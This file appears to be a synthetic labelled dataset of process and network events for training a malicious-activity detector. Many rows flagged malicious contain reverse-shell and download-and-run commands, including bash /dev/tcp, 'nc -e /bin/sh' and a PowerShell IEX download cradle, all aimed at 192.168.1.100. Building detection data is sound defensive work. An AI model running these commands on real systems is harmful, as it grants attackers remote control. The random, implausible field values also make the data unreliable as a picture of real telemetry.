timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-03-29 15:15:45.637352,6311cccb,svchost.exe,cmd.exe,27.141.78.176,167.99.88.105,8080,UDP,1072,1723,53.25,dir,0
2025-02-25 18:41:45.131802,6444af77,explorer.exe,notepad.exe,39.168.41.208,23.248.127.215,1337,UDP,779,2841,5.26,cd,0
2025-03-05 16:51:46.027980,27b035f9,init,svchost.exe,237.126.228.94,35.2.158.33,4444,TCP,233,1120,33.87,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-23 22:17:46.252555,5757c198,explorer.exe,explorer.exe,134.212.101.24,195.218.216.70,22,TCP,4336,377,18.97,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-16 18:44:46.204960,d13bf619,svchost.exe,perl,91.226.88.253,233.120.199.205,3389,TCP,1282,3243,8.14,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-13 09:44:45.739437,5c3e9b6c,init,chrome.exe,48.47.112.113,91.161.119.214,443,TCP,1567,331,0.89,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-29 07:36:44.999249,5295670b,init,svchost.exe,41.154.5.65,62.22.234.41,3389,UDP,4442,3530,25.73,cd,0
2025-03-29 04:10:45.462141,0c0713b9,explorer.exe,powershell,239.208.67.70,126.238.98.51,4444,TCP,4742,3093,57.26,cd,0
2025-04-16 19:41:44.757843,f238e5c3,systemd,explorer.exe,156.26.46.76,32.137.190.101,443,TCP,141,2288,9.29,ping,0
2025-04-19 10:47:45.312016,128b688b,init,notepad.exe,49.134.55.38,97.52.28.153,8080,UDP,4042,1823,11.69,ls,0
2025-03-16 11:14:45.993312,36b89c60,explorer.exe,cmd.exe,92.242.87.63,251.91.181.207,22,TCP,4716,2667,17.11,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-17 11:29:45.713102,6b68ea8c,systemd,bash,56.10.180.184,192.173.251.250,22,TCP,2922,782,32.92,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-11 17:13:45.241907,b98cc2b9,systemd,chrome.exe,245.124.7.187,141.111.212.89,3389,TCP,3880,714,43.44,ls,0
2025-04-22 06:16:46.168881,1276e1a0,init,bash,238.179.57.215,152.146.225.249,3389,UDP,4308,3746,19.87,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-27 22:49:45.906364,d8bf5ef8,svchost.exe,chrome.exe,147.129.28.230,65.75.56.88,4444,TCP,3236,4241,44.44,"python -c 'import socket,subprocess'",1
2025-03-19 13:04:45.869827,5fbdcf94,init,notepad.exe,124.42.37.165,80.206.86.14,22,UDP,840,660,28.01,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-26 16:11:45.191423,767b5f11,systemd,chrome.exe,43.115.223.164,14.12.190.46,8080,TCP,3595,3630,34.31,ls,0
2025-04-23 00:17:46.238257,81c6d51d,systemd,explorer.exe,204.240.129.73,142.87.68.187,4444,UDP,1091,4106,35.58,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-18 01:16:45.788716,c1cc37eb,svchost.exe,chrome.exe,243.224.163.100,152.41.197.107,3389,TCP,726,1446,6.55,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-30 20:05:45.445652,5331444d,systemd,nc,159.92.56.55,117.235.134.128,4444,UDP,1403,2487,28.67,ping,0
2025-04-18 16:33:44.798992,3344db27,svchost.exe,powershell,186.146.145.160,104.41.100.156,8080,TCP,4375,1967,32.44,ipconfig,0
2025-03-20 15:50:45.829877,3ad3a708,svchost.exe,python.exe,35.210.105.41,234.13.8.247,8080,UDP,4449,561,24.68,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-28 03:11:45.777876,1ef5e511,systemd,perl,168.48.164.157,140.80.9.195,1337,UDP,2621,760,31.75,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-06 09:10:46.340281,fa6aaffb,explorer.exe,perl,80.139.26.25,26.110.242.18,22,TCP,2052,2107,8.02,"python -c 'import socket,subprocess'",1
2025-03-28 16:14:44.762715,ce225fce,init,svchost.exe,170.149.19.123,215.153.223.41,22,TCP,3042,1207,4.83,dir,0
2025-04-28 19:59:45.010191,01b70162,init,nc,170.90.99.95,138.37.87.246,4444,UDP,4233,2005,30.43,ipconfig,0
2025-04-09 19:11:45.406022,efcfc155,systemd,nc,194.76.181.245,80.157.210.250,8080,TCP,4796,2265,21.39,ls,0
2025-04-01 20:21:46.298087,6096f238,explorer.exe,notepad.exe,247.57.213.249,5.104.102.122,1337,UDP,1025,1482,18.7,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-14 20:29:45.966223,3c08a52e,explorer.exe,explorer.exe,96.82.215.94,172.36.140.76,8080,UDP,106,3782,7.38,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-19 14:44:45.727560,4d381891,svchost.exe,cmd.exe,253.73.142.181,225.133.11.163,3389,TCP,562,2403,33.27,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-03 12:25:44.715494,57af58f3,systemd,explorer.exe,62.225.146.243,21.22.188.125,22,TCP,1101,3943,56.82,ls,0
2025-03-13 19:44:46.261567,cd84f65e,systemd,notepad.exe,100.186.124.191,86.47.56.95,8080,UDP,3310,4896,29.45,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-01 22:08:45.893204,27e2a30f,explorer.exe,svchost.exe,5.3.120.168,49.106.201.66,1337,TCP,823,96,50.11,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-22 08:19:45.355480,9499d476,svchost.exe,explorer.exe,237.164.180.108,99.106.44.88,3389,TCP,4716,1381,19.46,ls,0
2025-04-27 10:20:46.099449,3a7363da,systemd,powershell,123.122.150.69,72.149.50.106,443,UDP,1489,3050,42.75,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-04 04:05:45.458301,8cdc0454,explorer.exe,python.exe,168.66.192.2,254.30.41.96,8080,UDP,1034,454,39.0,ls,0
2025-03-26 18:40:44.996348,b0ed795b,systemd,chrome.exe,62.17.13.46,104.92.177.82,8080,UDP,3958,2214,41.01,ipconfig,0
2025-03-26 22:41:44.922844,b39dfdb6,explorer.exe,nc,164.223.174.110,190.85.139.162,4444,UDP,3037,3735,35.59,ls,0
2025-02-25 11:49:46.044045,88bdae30,init,bash,151.62.244.142,200.51.70.44,4444,TCP,1482,1536,55.3,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-28 06:41:45.372803,db479d78,svchost.exe,perl,47.134.79.178,243.200.177.79,3389,TCP,3807,967,8.61,cd,0
2025-02-25 01:13:45.889581,51a24cd6,systemd,notepad.exe,176.189.225.210,96.234.19.77,1337,UDP,2858,4971,43.44,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-08 06:19:45.360823,517cf65d,init,perl,117.149.69.9,91.222.145.197,22,UDP,3947,4421,8.44,dir,0
2025-03-14 19:34:45.219266,4ef0bf0b,explorer.exe,powershell,190.144.186.202,113.208.31.220,443,TCP,945,866,31.82,ping,0
2025-03-09 08:12:45.986279,08270301,explorer.exe,python.exe,121.195.166.29,188.189.236.24,443,UDP,3879,2682,13.23,"python -c 'import socket,subprocess'",1
2025-03-18 21:06:45.227940,e7c64f90,explorer.exe,nc,89.50.68.172,52.83.128.235,8080,TCP,3090,2187,3.38,dir,0
2025-03-01 20:24:44.910462,3f91c827,svchost.exe,chrome.exe,40.92.166.226,65.109.167.129,1337,UDP,1579,4662,24.8,cd,0
2025-02-24 12:56:45.065449,95da6c2b,init,python.exe,33.199.247.173,104.9.93.177,8080,UDP,4530,613,18.85,ping,0
2025-03-08 09:11:44.865332,4e47f936,systemd,explorer.exe,182.245.195.148,73.210.209.18,22,TCP,223,1516,37.73,cd,0
2025-03-21 00:55:45.710424,0af789d1,explorer.exe,bash,49.17.129.9,241.29.26.211,22,TCP,2712,3568,46.52,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-11 14:35:46.290323,c4da0405,systemd,svchost.exe,195.43.42.106,77.130.243.197,443,UDP,1145,3472,51.01,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-25 21:23:45.554511,621251a3,svchost.exe,svchost.exe,210.30.93.34,93.175.133.157,22,TCP,2054,172,21.19,cd,0
2025-05-01 02:25:45.793784,3b810327,systemd,powershell,109.234.124.217,133.63.191.127,22,TCP,3500,2626,51.04,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-06 13:37:46.384732,c1f8cd83,systemd,nc,98.215.43.198,51.212.11.189,443,TCP,4194,813,53.44,"python -c 'import socket,subprocess'",1
2025-04-25 07:44:46.264039,854f7d54,svchost.exe,perl,78.171.29.72,217.210.92.201,8080,TCP,2926,953,7.14,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-30 00:23:45.973654,685c3afb,svchost.exe,bash,228.129.63.100,252.186.80.177,3389,TCP,4134,2834,51.44,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-05 12:28:45.429230,28b31217,svchost.exe,powershell,138.117.167.239,136.193.38.197,1337,UDP,1136,2303,4.48,ping,0
2025-04-11 03:04:44.823503,3436530a,explorer.exe,powershell,170.239.218.112,170.78.156.231,8080,TCP,2037,2640,2.75,cd,0
2025-04-21 10:00:45.849189,800f9f8a,systemd,chrome.exe,47.234.50.96,226.186.93.30,3389,UDP,2242,652,21.69,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-08 01:48:45.379808,8c154cfb,systemd,cmd.exe,131.58.240.136,134.109.178.254,4444,UDP,4671,3119,12.82,ls,0
2025-04-26 04:03:44.928024,e3e9c61a,systemd,nc,19.89.39.228,216.183.69.49,22,TCP,582,2795,40.58,cd,0
2025-03-26 23:23:46.183864,7002c260,svchost.exe,perl,166.30.236.63,153.99.24.58,8080,TCP,330,679,51.66,"python -c 'import socket,subprocess'",1
2025-03-02 11:30:46.406046,aff12f01,explorer.exe,chrome.exe,212.99.224.138,104.4.237.242,22,UDP,1901,4319,39.04,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-16 01:57:46.250777,1cc24b30,svchost.exe,notepad.exe,13.89.20.106,61.41.84.116,4444,TCP,3135,863,27.37,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-11 02:33:45.958641,1842a2cc,init,svchost.exe,89.119.88.232,15.239.130.5,4444,TCP,821,2789,4.29,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-16 14:11:45.905600,1bba4200,svchost.exe,notepad.exe,224.54.187.173,21.228.250.167,3389,UDP,3788,1904,33.53,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-11 01:25:44.962781,671ee080,systemd,explorer.exe,145.4.72.2,13.64.126.239,8080,UDP,4589,2583,50.04,ipconfig,0
2025-03-26 06:11:45.066847,81cad0fc,explorer.exe,python.exe,29.38.123.197,226.14.190.25,22,TCP,3499,508,23.79,ls,0
2025-03-13 04:20:46.026500,f38fe3dc,svchost.exe,notepad.exe,30.159.150.10,161.133.54.125,22,UDP,3196,3735,12.22,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-23 02:13:45.853048,179fbf61,systemd,python.exe,132.142.149.135,109.112.218.68,4444,TCP,3374,3129,33.11,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-21 23:54:45.769238,59f79791,systemd,powershell,151.196.234.240,74.71.84.227,8080,TCP,604,1527,5.77,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-17 17:48:46.263949,66dac8b9,svchost.exe,chrome.exe,207.140.144.43,180.16.117.218,443,UDP,3974,1856,32.68,"python -c 'import socket,subprocess'",1
2025-04-15 07:24:45.806359,13058251,svchost.exe,bash,171.17.206.113,167.65.94.215,8080,UDP,2363,1880,33.26,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-31 13:36:44.789505,91227c4a,systemd,cmd.exe,50.246.222.234,187.6.172.22,8080,UDP,2570,3418,47.55,ping,0
2025-03-30 00:56:45.861532,751df4d9,systemd,svchost.exe,177.179.183.32,216.6.246.17,22,TCP,3358,116,2.01,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-26 13:57:45.826900,ca51c528,init,powershell,20.17.31.228,1.51.23.177,1337,TCP,551,4092,43.12,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-27 19:35:45.736284,8811b124,svchost.exe,python.exe,235.147.38.221,233.141.212.82,22,UDP,2741,2517,41.02,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-01 10:33:45.394151,9a39e2d7,systemd,bash,111.131.76.205,120.117.57.242,3389,UDP,170,256,4.83,ls,0
2025-04-18 23:30:45.732428,488c496e,init,powershell,204.128.130.249,72.40.179.187,22,TCP,4264,4508,36.14,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-07 13:32:45.902087,83974c36,systemd,python.exe,150.189.214.38,209.176.86.74,1337,UDP,1652,4314,23.66,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-07 08:04:44.916116,c53cf3de,init,notepad.exe,79.49.6.229,115.102.133.167,443,TCP,4779,4203,26.69,ipconfig,0
2025-03-19 22:09:45.052910,c027305e,explorer.exe,bash,71.230.190.91,156.249.173.242,3389,TCP,3668,574,12.73,dir,0
2025-03-13 22:45:44.928070,3845a91c,systemd,explorer.exe,159.234.229.189,94.62.187.248,22,TCP,1389,3027,9.89,cd,0
2025-04-28 10:11:46.197873,616d55cb,init,explorer.exe,234.108.73.120,9.104.184.91,4444,UDP,1632,3360,19.77,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-30 09:14:44.769185,39002df9,init,cmd.exe,146.170.83.215,68.217.46.114,8080,TCP,3653,122,28.04,ping,0
2025-04-17 03:37:45.688026,22b9f486,explorer.exe,explorer.exe,63.243.146.223,71.40.68.182,4444,UDP,1380,2160,26.33,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-01 00:24:45.034659,f9bd7a98,systemd,python.exe,55.161.35.185,252.74.31.43,8080,UDP,3352,1506,57.36,dir,0
2025-03-17 05:30:44.959382,1e1f3559,init,notepad.exe,167.69.147.30,65.27.222.5,1337,UDP,1077,3166,56.92,cd,0
2025-03-13 23:44:45.589098,1c1c51c9,init,chrome.exe,83.96.131.248,180.24.230.22,22,TCP,1408,3488,3.83,ping,0
2025-03-05 04:03:45.769759,4947eab8,explorer.exe,bash,50.53.242.136,181.8.38.86,4444,UDP,2071,3564,18.17,"python -c 'import socket,subprocess'",1
2025-03-25 00:45:45.162230,0bb1fb46,explorer.exe,python.exe,146.9.74.46,185.17.175.99,3389,UDP,730,3601,11.9,cd,0
2025-03-08 09:19:46.369930,87f13251,systemd,explorer.exe,71.83.18.194,46.223.161.96,8080,UDP,850,1433,41.14,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-21 05:39:44.812063,04192f59,explorer.exe,nc,108.67.197.40,126.130.210.207,3389,UDP,1051,2671,28.4,ipconfig,0
2025-04-07 06:17:46.060716,419586f4,svchost.exe,powershell,76.3.212.222,80.212.22.94,1337,TCP,4416,1149,29.06,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-26 14:59:46.293708,a31f9a04,systemd,notepad.exe,217.111.130.226,254.184.190.198,1337,UDP,2096,3849,27.82,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-07 10:52:46.304585,7ff2e545,svchost.exe,explorer.exe,54.251.78.72,56.63.176.199,1337,UDP,1321,596,43.02,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-05 15:24:45.067463,fe476c42,systemd,python.exe,189.138.59.221,88.185.195.28,22,TCP,3464,3909,2.1,cd,0
2025-03-21 18:09:45.507697,453d15ac,init,python.exe,176.155.96.145,198.101.143.11,3389,TCP,3587,2246,18.16,cd,0
2025-03-26 17:43:45.599924,3d59e455,explorer.exe,svchost.exe,207.105.252.87,37.89.224.16,4444,UDP,2029,1927,34.52,ls,0
2025-04-29 03:56:46.409364,00b50a70,explorer.exe,perl,1.3.160.194,2.64.61.129,22,UDP,3174,1745,19.54,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-10 18:22:45.243091,346fb7b5,init,perl,138.136.1.184,60.44.202.164,4444,UDP,1404,4184,25.75,ping,0
2025-03-08 21:33:45.438639,92a5e21f,explorer.exe,svchost.exe,172.155.86.145,144.133.177.133,8080,TCP,4573,4591,46.44,ping,0
2025-04-14 13:03:44.879777,47f1dc4a,init,cmd.exe,14.12.160.61,169.254.188.185,3389,TCP,4517,1705,17.05,ipconfig,0
2025-03-25 21:32:45.901239,1a69b4a0,init,svchost.exe,33.252.244.184,27.86.130.92,1337,TCP,3884,1118,6.24,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-31 05:16:46.106171,a0ce9fd7,systemd,notepad.exe,199.105.32.3,153.161.135.150,1337,TCP,2039,2092,18.91,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-05 19:27:44.890570,24291dce,explorer.exe,explorer.exe,144.103.137.127,228.205.69.75,22,TCP,1614,2865,55.71,ipconfig,0
2025-04-08 16:31:46.122656,afe10d37,explorer.exe,bash,122.244.190.49,73.194.197.163,8080,UDP,3152,4171,39.96,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-22 22:00:44.856766,c42a84e3,systemd,nc,86.170.254.17,253.179.149.54,4444,UDP,2091,4276,36.21,dir,0
2025-04-07 05:44:46.293080,388f963f,explorer.exe,cmd.exe,239.100.57.221,88.195.143.251,8080,UDP,1572,1591,16.65,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-25 22:24:45.619343,719b11be,explorer.exe,powershell,78.83.203.146,201.234.54.151,8080,TCP,3742,4076,29.49,ipconfig,0
2025-03-12 19:49:45.966779,94064998,svchost.exe,chrome.exe,237.122.215.78,89.36.42.164,8080,TCP,2891,3990,0.29,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-20 02:37:46.093806,b544868f,svchost.exe,perl,38.14.206.57,109.92.52.230,22,UDP,373,3525,5.55,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-18 11:26:45.188442,3ba430b7,systemd,chrome.exe,235.138.197.95,132.104.70.251,443,UDP,598,2735,49.69,cd,0
2025-04-27 07:53:45.751556,808f2018,svchost.exe,svchost.exe,223.66.44.183,89.70.251.113,8080,UDP,1885,1651,43.43,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-09 04:51:45.025193,0d5eae01,explorer.exe,bash,181.99.171.102,1.86.227.235,22,UDP,4284,4695,1.68,ls,0
2025-04-11 03:20:44.993286,a5491701,init,powershell,146.252.30.10,8.80.166.223,3389,TCP,2140,3343,2.29,dir,0
2025-03-07 00:43:44.804034,d2a1fa94,explorer.exe,bash,101.87.47.115,193.87.187.224,443,TCP,1696,1143,31.27,ls,0
2025-03-01 01:16:45.410641,cf6cd7f1,explorer.exe,nc,95.23.9.161,245.245.167.129,4444,UDP,1527,2853,33.38,dir,0
2025-04-03 22:30:46.383256,8258fa02,init,chrome.exe,67.38.243.25,179.212.238.18,22,TCP,816,1520,39.87,"python -c 'import socket,subprocess'",1
2025-04-10 02:58:45.697592,27368338,svchost.exe,explorer.exe,222.75.218.176,114.65.125.64,3389,TCP,2730,344,32.48,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-24 01:39:45.576869,419dfd92,init,powershell,117.123.86.191,56.70.73.193,8080,TCP,2068,3567,11.51,ls,0
2025-03-03 03:25:46.304061,950a015d,systemd,bash,234.96.158.169,12.87.252.247,1337,TCP,1354,3195,1.71,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-25 17:58:45.042012,2f9f0ffd,systemd,powershell,214.49.87.135,27.202.127.130,22,TCP,2990,1306,17.96,ping,0
2025-04-07 03:26:45.742769,6ca217fc,explorer.exe,bash,30.21.61.3,211.154.47.131,3389,UDP,4219,1196,6.39,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-12 20:42:45.080089,5b62ac52,systemd,python.exe,128.73.20.92,31.246.141.195,22,TCP,2100,1499,41.14,ipconfig,0
2025-03-23 06:12:44.976409,683866f5,init,notepad.exe,46.216.44.77,13.142.2.220,1337,UDP,3929,313,0.85,cd,0
2025-04-16 02:17:45.983636,95f5bd8e,svchost.exe,explorer.exe,89.184.136.83,185.90.135.46,3389,TCP,4081,2270,54.28,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-19 03:39:45.145085,ad1c9b22,explorer.exe,explorer.exe,218.95.86.98,169.39.149.115,4444,UDP,4867,1920,57.84,ipconfig,0
2025-04-22 09:25:45.968582,bf974ef2,svchost.exe,explorer.exe,37.84.83.210,51.140.130.141,4444,TCP,2526,3127,24.15,"python -c 'import socket,subprocess'",1
2025-04-08 07:26:45.609559,a345c206,init,bash,41.142.191.193,214.194.155.15,1337,UDP,959,4278,11.43,dir,0
2025-04-19 05:17:45.859004,12730118,init,notepad.exe,199.21.58.39,99.37.254.230,22,UDP,4788,354,43.47,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-12 08:47:44.761942,d9a51064,systemd,nc,57.84.69.53,149.162.207.220,8080,TCP,3704,1948,43.82,cd,0
2025-02-28 21:46:45.048694,21945d25,svchost.exe,notepad.exe,27.170.152.67,187.31.215.164,1337,UDP,4753,1271,38.71,ping,0
2025-04-01 17:02:44.812806,7740e1fe,svchost.exe,bash,244.66.199.3,81.50.175.168,1337,UDP,3420,3738,3.56,cd,0
2025-04-16 10:33:46.409006,2ed78180,systemd,svchost.exe,163.95.49.182,253.92.44.177,443,UDP,2241,2011,0.66,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-28 17:53:46.114240,43f5712d,explorer.exe,explorer.exe,217.252.94.76,119.226.138.237,1337,TCP,4862,539,54.33,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-07 23:18:46.372859,1d35bc46,explorer.exe,python.exe,12.179.69.220,166.233.79.87,22,TCP,1997,1091,6.39,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-29 23:09:46.400750,9f48a1b7,explorer.exe,perl,66.79.70.133,242.115.154.95,1337,TCP,419,2401,22.68,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-06 19:55:45.213382,8e1f1092,svchost.exe,cmd.exe,43.24.184.50,156.117.199.78,443,UDP,2925,4199,54.32,ipconfig,0
2025-03-28 16:25:45.446416,b77f3482,init,notepad.exe,169.60.217.214,79.46.49.138,1337,UDP,1752,788,5.09,ping,0
2025-03-30 09:35:45.441426,95c2ed1b,init,chrome.exe,29.41.244.50,213.145.243.163,8080,UDP,4822,4199,10.82,dir,0
2025-03-03 09:47:46.166645,320062d1,init,perl,174.247.149.113,95.70.121.22,3389,TCP,4357,344,22.96,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-16 17:59:45.878364,5b7f2ee6,svchost.exe,nc,103.140.151.155,122.172.214.31,1337,TCP,2840,3624,5.72,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-11 02:01:45.041865,e8c16fd0,init,nc,247.171.44.100,117.213.77.219,1337,UDP,2090,1894,36.93,ls,0
2025-02-27 10:10:46.406557,11a7cdf5,init,powershell,17.232.103.56,215.224.87.116,3389,UDP,3549,3605,58.52,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-23 18:12:45.635743,1b40a2f4,explorer.exe,chrome.exe,192.103.8.228,202.182.62.66,8080,TCP,2999,2443,51.69,ls,0
2025-03-08 22:24:46.196887,8fcfbffa,systemd,cmd.exe,20.125.220.191,42.84.236.140,3389,UDP,1546,2196,45.83,"python -c 'import socket,subprocess'",1
2025-04-23 00:27:45.402032,acb6a72e,systemd,cmd.exe,221.61.91.1,196.80.28.75,8080,UDP,3066,1360,52.95,dir,0
2025-04-04 23:33:46.122606,84d5e1e4,explorer.exe,nc,132.212.195.75,103.195.43.35,8080,UDP,3385,2196,32.07,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-01 17:59:45.240575,e8ba8a74,explorer.exe,perl,253.244.122.200,182.91.145.182,3389,TCP,3101,1670,30.07,ipconfig,0
2025-04-18 22:48:45.093607,e666246d,init,python.exe,222.124.226.38,74.138.157.85,8080,UDP,2714,2351,25.39,ls,0
2025-02-25 11:56:45.227790,54bfd36c,init,powershell,6.26.118.80,232.132.212.54,3389,TCP,3537,781,9.37,ipconfig,0
2025-04-05 05:31:46.017582,a4c389ea,svchost.exe,python.exe,8.149.22.206,30.126.89.174,4444,TCP,2643,197,30.71,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-30 02:08:44.766818,95c8e790,svchost.exe,explorer.exe,56.73.212.152,32.14.126.79,22,UDP,2935,55,3.09,ls,0
2025-03-06 12:40:45.246383,3b24bc95,systemd,python.exe,52.95.238.194,141.27.101.243,22,TCP,179,1629,25.2,ipconfig,0
2025-02-25 11:27:45.765949,e2402ee6,svchost.exe,python.exe,21.170.178.232,41.170.74.152,4444,TCP,1006,433,53.47,"python -c 'import socket,subprocess'",1
2025-03-14 18:32:45.533433,69445ad1,systemd,powershell,215.173.76.112,249.15.224.85,3389,UDP,341,2832,32.06,ls,0
2025-03-27 13:51:46.103714,37575961,svchost.exe,perl,129.36.226.8,116.54.170.46,8080,TCP,4776,2797,7.68,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-11 15:31:45.533212,ea2eef1f,init,perl,150.188.244.244,37.97.251.94,22,UDP,1056,239,19.54,dir,0
2025-04-09 21:22:45.747297,64672f35,svchost.exe,chrome.exe,127.48.237.250,52.180.126.124,1337,UDP,1503,2421,29.15,"python -c 'import socket,subprocess'",1
2025-03-05 15:20:45.380396,6719db91,systemd,python.exe,73.81.67.18,133.252.136.98,443,TCP,1761,4990,18.92,cd,0
2025-02-26 19:02:45.906998,70614e30,explorer.exe,cmd.exe,12.93.20.192,183.194.62.129,443,TCP,4639,1179,9.97,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-31 13:14:45.443112,ad58a438,systemd,nc,224.184.113.147,167.129.166.64,443,TCP,1617,3810,1.28,dir,0
2025-04-30 23:07:46.021945,d7574240,init,cmd.exe,79.139.42.134,225.216.189.81,443,UDP,3800,2209,14.79,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-28 17:52:46.410062,b940464c,init,python.exe,155.195.167.142,91.86.101.86,443,UDP,1497,4840,48.84,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
